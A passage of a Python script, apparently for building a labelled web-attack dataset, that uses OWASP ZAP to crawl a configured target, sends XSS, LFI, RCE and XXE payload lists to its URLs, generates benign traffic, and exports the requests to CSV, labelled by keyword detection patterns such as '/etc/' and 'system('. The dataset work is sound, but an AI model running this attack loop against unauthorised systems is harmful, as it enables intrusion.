        url = random.choice(attack_urls)
        param = random.choice(param_names)
        try:
            session.post(
                url, data={param: payload},
                proxies={'http': PROXY, 'https': PROXY},
                verify=False, timeout=10
            )
            stats['XSS'] += 1
        except:
            pass
        
        if i % 50 == 0:
            log(f"  XSS: {i}/{len(xss_payloads)}")
        time.sleep(0.05)
    
    # Send LFI
    log("\n[3/5] Sending LFI...")
    for i, payload in enumerate(lfi_payloads, 1):
        url = random.choice(attack_urls)
        param = random.choice(['file', 'page', 'path'])
        try:
            session.get(
                f"{url}?{param}={urllib.parse.quote(payload)}",
                proxies={'http': PROXY, 'https': PROXY},
                verify=False, timeout=10
            )
            stats['LFI'] += 1
        except:
            pass
        
        if i % 50 == 0:
            log(f"  LFI: {i}/{len(lfi_payloads)}")
        time.sleep(0.05)
    
    # Send RCE
    log("\n[4/5] Sending RCE...")
    for i, payload in enumerate(rce_payloads, 1):
        url = random.choice(attack_urls)
        param = random.choice(['cmd', 'exec'])
        try:
            session.post(
                url, data={param: payload},
                proxies={'http': PROXY, 'https': PROXY},
                verify=False, timeout=10
            )
            stats['RCE'] += 1
        except:
            pass
        
        if i % 50 == 0:
            log(f"  RCE: {i}/{len(rce_payloads)}")
        time.sleep(0.05)
    
    # Send XXE
    log("\n[5/5] Sending XXE...")
    for i, payload in enumerate(xxe_payloads, 1):
        url = random.choice(attack_urls)
        try:
            session.post(
                url, data={'xml': payload},
                proxies={'http': PROXY, 'https': PROXY},
                verify=False, timeout=10
            )
            stats['XXE'] += 1
        except:
            pass
        
        if i % 50 == 0:
            log(f"  XXE: {i}/{len(xxe_payloads)}")
        time.sleep(0.05)
    
    log("\n✅ Attack phase complete!")

# ====================== BENIGN PHASE ======================
def benign_browsing(zap, all_urls):
    """STEP 5: Generate benign traffic"""
    log("\n" + "="*80)
    log("STEP 5: BENIGN TRAFFIC", "OK")
    log("="*80)
    
    gen = BenignGenerator()
    benign_data = gen.generate_benign_data(1000)
    
    log(f"Generated {len(benign_data)} benign inputs")
    
    # Select URLs for benign traffic
    benign_urls = sorted(all_urls, key=url_priority, reverse=True)[:10]
    if not benign_urls:
        benign_urls = [TARGET]
    
    param_names = ['q', 'search', 'tbComment', 'name', 'message']
    
    for i, data in enumerate(benign_data, 1):
        url = random.choice(benign_urls)
        param = random.choice(param_names)
        
        try:
            session.post(
                url, data={param: data},
                proxies={'http': PROXY, 'https': PROXY},
                verify=False, timeout=10
            )
            stats['BENIGN'] += 1
        except:
            pass
        
        if i % 100 == 0:
            log(f"  Benign: {i}/{len(benign_data)}")
        time.sleep(0.03)
    
    log("\n✅ Benign phase complete!")

# ====================== EXPORT ======================
def parse_request_header(req_header):
    """Parse request headers"""
    method = "GET"
    url = ""
    first_line = ""
    headers_dict = {}
    
    if not req_header:
        return method, url, headers_dict, first_line
    
    lines = req_header.split("\n")
    
    if lines:
        first_line = lines[0].strip()
        parts = first_line.split(" ", 2)
        
        if len(parts) >= 2:
            method = parts[0]
            url_part = parts[1]
            url = url_part if url_part.startswith("http") else url_part
    
    for line in lines[1:]:
        line = line.strip()
        if not line or line.startswith("HTTP/"):
            continue
        
        if ':' in line:
            k, v = line.split(':', 1)
            k = k.strip()
            v = v.strip()
            if k and v:
                headers_dict[k] = v
    
    if url and not url.startswith("http"):
        host = headers_dict.get('Host', urllib.parse.urlparse(TARGET).netloc)
        scheme = "https" if "https" in TARGET else "http"
        url = f"{scheme}://{host}{url}"
    
    return method, url, headers_dict, first_line

def headers_to_pipe_format(headers_dict):
    """Convert headers to pipe format"""
    if not headers_dict:
        return ""
    
    ordered_keys = []
    if 'Host' in headers_dict:
        ordered_keys.append('Host')
    
    for k in sorted(headers_dict.keys()):
        if k != 'Host':
            ordered_keys.append(k)
    
    parts = []
    for k in ordered_keys:
        v = headers_dict[k]
        v_escaped = str(v).replace('|', '&#124;')
        parts.append(f"{k}: {v_escaped}")
    
    return "|".join(parts)

def export_from_zap(zap):
    """STEP 6: Export all traffic to CSV"""
    log("\n" + "="*80)
    log("STEP 6: EXPORT TO CSV", "OK")
    log("="*80)
    
    time.sleep(10)
    
    try:
        msgs = zap.core.messages(start=0, count=20000)
        log(f"Retrieved {len(msgs)} messages from ZAP")
        
        domain = urllib.parse.urlparse(TARGET).netloc
        rows = []
        seen_sigs = set()
        
        for m in msgs:
            if not isinstance(m, dict):
                continue
            
            req_header = m.get("requestHeader", "")
            req_body = m.get("requestBody", "")
            resp_header = m.get("responseHeader", "")
            resp_body = m.get("responseBody", "")
            
            method, url, headers_dict, first_line = parse_request_header(req_header)
            
            if not url or domain not in url:
                continue
            
            if 'Host' not in headers_dict and url:
                parsed = urllib.parse.urlparse(url)
                if parsed.netloc:
                    headers_dict['Host'] = parsed.netloc
            
            req_header_formatted = headers_to_pipe_format(headers_dict)
            
            # Tool detection
            payload = req_body.lower() if req_body else ""
            url_lower = url.lower() if url else ""
            combined = payload + " " + url_lower
            
            tool = "BENIGN"
            
            if any(x in combined for x in ['union select', "'--", ' --', 'sleep(', 'waitfor']):
                tool = "SQLI"
            elif '<!entity' in combined and '<?xml' in combined:
                tool = "XXE"
            elif any(x in combined for x in ['<script', 'alert(', 'onerror=', '<svg']):
                tool = "XSS"
            elif any(x in combined for x in ['../', '/etc/', 'c:\\']):
                tool = "LFI"
            elif any(x in combined for x in ['<?php', 'system(', 'exec(']):
                tool = "RCE"
            
            # No dedup
            sig = hashlib.md5(f"{tool}|{req_body}|{url}|{time.time()}|{random.random()}".encode()).hexdigest()
            if sig in seen_sigs:
                continue
            seen_sigs.add(sig)
            
            clean_req_body = clean_multiline(req_body)
            clean_resp_body = clean_multiline(resp_body)[:15000]
            
            rows.append([
                m.get("timestamp", str(int(time.time() * 1000))),
                tool,
                method,
                url,
                req_header_formatted,
                clean_req_body,
                clean_multiline(resp_header),
                clean_resp_body,
                first_line if first_line else f"{method} / HTTP/1.1"
            ])
        
        # Write CSV
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        
        with open(FINAL_CSV, 'w', newline="", encoding="utf-8") as f:
            writer = csv.writer(f, quoting=csv.QUOTE_ALL, escapechar='\\')
            writer.writerow([
                "timestamp", "tool", "method", "url", "req_header",
                "req_body", "resp_header", "resp_body", "full_request"
            ])
            writer.writerows(rows)
        
        stats['exported'] = len(rows)
        log(f"✅ Exported {len(rows)} requests to {FINAL_CSV}", "OK")
        
        # Count by tool
        tool_counts = {}
        for row in rows:
            tool = row[1]
            tool_counts[tool] = tool_counts.get(tool, 0) + 1
        
        log("\nBreakdown by Tool:")
        for tool, count in sorted(tool_counts.items()):
            log(f"  {tool}: {count}")
        
        return len(rows)
        
    except Exception as e:
        log(f"Export error: {e}", "ERROR")
        import traceback
        traceback.print_exc()
        return 0

# ====================== MAIN ======================
def main():
    print("\n" + "="*80)
    print(" PHASE 1: COMPLETE WORKFLOW")
    print(" ZAP Spider → AJAX Spider → Attack → Benign → Export")
    print("="*80)
    print(f" Target: {TARGET}")
    print(f" ZAP: {PROXY}")
    print(f" Output: {FINAL_CSV}")
    if COOKIE:
        # Chỉ hiển thị một phần cookie để bảo mật
        cookie_preview = COOKIE[:30] + "..." if len(COOKIE) > 30 else COOKIE
        print(f" Cookie: {cookie_preview} (authenticated mode)")
    else:
        print(" Cookie: None (anonymous mode)")
    print("="*80 + "\n")
    
    # Connect to ZAP
    zap = get_zap()
    if not zap:
        sys.exit(1)
    
    # Setup authentication với cookie (nếu có)
    context_name = setup_zap_authentication(zap)
    
    # Set proxy cho session
    os.environ["http_proxy"] = PROXY
    os.environ["https_proxy"] = PROXY
    
    start_time = time.time()
    
    # Step 1: Spider với context authentication
    spider_urls = spider_crawl(zap, context_name)
    if not spider_urls:
        log("Spider found no URLs, trying fallback with target URL only...", "WARNING")
        # Fallback: Sử dụng TARGET URL và các common paths
        spider_urls = [TARGET]
        common_paths = ['/', '/login', '/search', '/contact', '/about', '/register', '/admin']
        domain = urllib.parse.urlparse(TARGET).netloc
        scheme = 'https' if TARGET.startswith('https') else 'http'
        for path in common_paths:
            spider_urls.append(f"{scheme}://{domain}{path}")
        
        # Truy cập các URLs này qua proxy để ZAP capture (với cookie nếu có)
        log("  Accessing common paths via proxy...", "INFO")
        headers = {"Cookie": COOKIE} if COOKIE else {}
        for url in spider_urls:
            try:
                requests.get(url, headers=headers,
                            proxies={'http': PROXY, 'https': PROXY}, 
                            verify=False, timeout=10)
                time.sleep(0.3)
            except:
                pass
        
        log(f"  Using {len(spider_urls)} fallback URLs", "OK")
    
    # Step 2: AJAX Spider
    all_urls = ajax_crawl(zap, spider_urls)
    
    # Step 3: Quick Scan
    param_urls, all_urls = quick_scan(zap, all_urls)
    
    # Step 4: Attack with Payloads
    attack_with_payloads(zap, param_urls, all_urls)
    
    # Step 5: Benign Traffic
    benign_browsing(zap, all_urls)
    
    # Step 6: Export
    exported = export_from_zap(zap)
    
    elapsed = time.time() - start_time
    
    # Summary
    print("\n" + "="*80)
    print(" ✅ PHASE 1 COMPLETE!")
    print("="*80)
    print(f" Total Time: {elapsed:.1f}s")
    if COOKIE:
        print(f" Mode: Authenticated (with cookie)")
    else:
        print(f" Mode: Anonymous")
    print(f"\n URLs Discovered:")
    print(f"   Spider:     {stats['spider_urls']}")
    print(f"   AJAX:       {stats['ajax_urls']}")
    print(f"   With Params: {stats['param_urls']}")
    print(f"\n Payloads Sent:")
    print(f"   SQLi:   {stats['SQLI']}")
    print(f"   XSS:    {stats['XSS']}")
    print(f"   LFI:    {stats['LFI']}")
    print(f"   RCE:    {stats['RCE']}")
    print(f"   XXE:    {stats['XXE']}")
    print(f"   Benign: {stats['BENIGN']}")
    print(f"\n Exported: {stats['exported']} requests")
    print(f" Output: {FINAL_CSV}")
    print("="*80 + "\n")
    
    # Exit
    if exported > 0:
        sys.exit(0)
    else:
        log("No requests exported!", "ERROR")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("\n[!] Stopped by user", "WARNING")
        sys.exit(1)
    except Exception as e:
        log(f"\n[!] Fatal error: {e}", "ERROR")
        import traceback
        traceback.print_exc()
        sys.exit(1)
